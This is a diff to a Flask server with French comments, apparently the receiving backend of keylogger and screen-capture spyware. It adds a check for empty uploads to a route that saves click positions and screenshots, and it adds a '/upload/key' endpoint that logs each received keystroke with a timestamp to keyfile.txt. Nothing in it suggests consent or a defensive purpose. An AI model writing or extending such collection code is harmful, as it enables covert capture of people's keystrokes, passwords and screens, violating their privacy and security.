@@ -13,6 +13,10 @@ if not os.path.exists('captures'):
 def upload_data():
     data = request.get_json()
 
+    # Vérifier que les données sont bien reçues
+    if not data:
+        return jsonify({"status": "error", "message": "No data received"}), 400
+
     # Extraire les informations de clic
     click_type = data.get('click_type')
     position = data.get('position')
@@ -30,6 +34,24 @@ def upload_data():
         with open(filename, "wb") as f:
             f.write(screenshot)
         print(f"Capture d'écran enregistrée sous {filename}")
+
+    return jsonify({"status": "success"}), 200
+
+@app.route('/upload/key', methods=['POST'])
+def upload_key():
+    data = request.get_json()
+
+    if not data:
+        return jsonify({"status": "error", "message": "No data received"}), 400
+
+    key = data.get('key')
+    timestamp = data.get('timestamp')
+
+    print(f"Réception d'une touche '{key}' à {timestamp}")
+
+    # Enregistrer les touches dans un fichier
+    with open('keyfile.txt', 'a', encoding='utf-8') as logKey:
+        logKey.write(f"{timestamp}: {key}\n")
 
     return jsonify({"status": "success"}), 200
 
